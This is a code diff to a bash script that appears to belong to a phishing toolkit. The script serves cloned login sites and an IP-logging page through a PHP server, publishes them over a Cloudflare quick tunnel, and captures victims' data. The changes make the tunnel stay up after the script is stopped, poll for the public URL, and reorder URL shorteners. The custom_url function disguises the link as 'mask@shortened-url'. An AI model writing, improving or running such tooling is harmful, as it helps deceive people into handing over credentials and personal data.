@@ -406,7 +406,7 @@ setup_site() {
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
-	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
+	cd .server/www && setsid php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 }
 
 ## Get IP address
@@ -450,21 +450,38 @@ capture_data() {
 }
 
 ## Start Cloudflared
-start_cloudflared() { 
-	rm .cld.log > /dev/null 2>&1 &
+start_cloudflared() {
+	rm -f .server/.cld.log > /dev/null 2>&1
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
+	# Run detached so Ctrl+C on the script doesn't take the tunnel down with it
+	# Force HTTP/2 over TCP + IPv4: QUIC/UDP drops easily behind NAT (Error 1033)
 	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && TUNNEL_TRANSPORT_PROTOCOL=http2 setsid termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --edge-ip-version 4 --logfile .server/.cld.log > /dev/null 2>&1 &
 	else
-		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
+		sleep 2 && TUNNEL_TRANSPORT_PROTOCOL=http2 setsid ./.server/cloudflared tunnel -url "$HOST":"$PORT" --edge-ip-version 4 --logfile .server/.cld.log > /dev/null 2>&1 &
 	fi
 
-	sleep 8
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.cld.log")
+	# Registration can take longer than a few seconds, poll instead of fixed sleep
+	cldflr_url=""
+	for _ in {1..40}; do
+		sleep 1
+		cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' ".server/.cld.log" 2> /dev/null | head -n 1)
+		[[ -n "$cldflr_url" ]] && break
+	done
+
+	if [[ -n "$cldflr_url" ]]; then
+		echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Public URL : ${CYAN}${cldflr_url}"
+		echo -e "${RED}[${WHITE}i${RED}]${GREEN} Tunnel & PHP server keep running after Ctrl+C. Stop with: ${ORANGE}killall cloudflared php"
+	else
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Cloudflared did not provide a URL."
+		echo -e "${RED}[${WHITE}!${RED}]${RED} Last log lines (${ORANGE}.server/.cld.log${RED}):"
+		tail -n 5 ".server/.cld.log" 2> /dev/null
+	fi
+
 	custom_url "$cldflr_url"
 	capture_data
 }
@@ -582,13 +599,10 @@ custom_url() {
 
 	{ custom_mask; sleep 1; clear; banner_small; }
 	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
-		if [[ $(site_stat $isgd) == 2* ]]; then
-			shorten $isgd "$url"
-		elif [[ $(site_stat $shortcode) == 2* ]]; then
-			shorten $shortcode "$url"
-		else
-			shorten $tinyurl "$url"
-		fi
+		# Keep known-broken shorteners as fallback only (is.gd: CF challenge, shrtco.de: dead)
+		shorten $tinyurl "$url"
+		[[ -z "$processed_url" ]] && shorten $isgd "$url"
+		[[ -z "$processed_url" ]] && processed_url="$url"
 
 		url="https://$url"
 		masked_url="$mask@$processed_url"
